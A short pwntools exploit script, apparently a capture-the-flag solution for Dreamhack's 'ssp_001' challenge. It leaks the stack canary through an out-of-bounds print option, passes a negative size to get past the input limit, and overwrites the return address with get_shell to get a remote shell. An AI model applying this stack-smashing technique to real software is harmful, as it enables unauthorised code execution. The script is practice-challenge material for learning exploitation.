from pwn import *

def slog(n, m):
    return success(": ".join([n, hex(m)]))


p = remote('host3.dreamhack.games', 20441)
# p = process('./ssp_001')

e = ELF('./ssp_001')
get_shell = e.symbols["get_shell"]

context.arch = "i386"

p.sendlineafter('> ', b'F')

payload = b'A' * (0x40)
p.sendlineafter('input : ', payload)


hexval = b'0x'
for i in range(127, 128+4):
    success(f'i = {i}')
    p.sendlineafter('> ', b'P')
    p.sendlineafter('index : ', f'{i}'.encode('utf-8'))

    p.recvuntil('is : ')
    hexval += p.recvn(2)

canary = hexval[-8:]

success(f'{canary} found: {canary[6:]} {canary[4:6]} {canary[2:4]} {canary[:2]}')
canary_rev = canary[6:] + canary[4:6] + canary[2:4] + canary[:2]
canary_rev = int(canary_rev, 16)

payload = b'A'*64 + p32(canary_rev) + b'B'*0x08 + p32(get_shell)
p.sendlineafter('> ', b'E')
p.sendlineafter('Size : ', b'-1') # 버퍼 입력 제한 회피
p.sendlineafter('Name : ', payload)

p.interactive()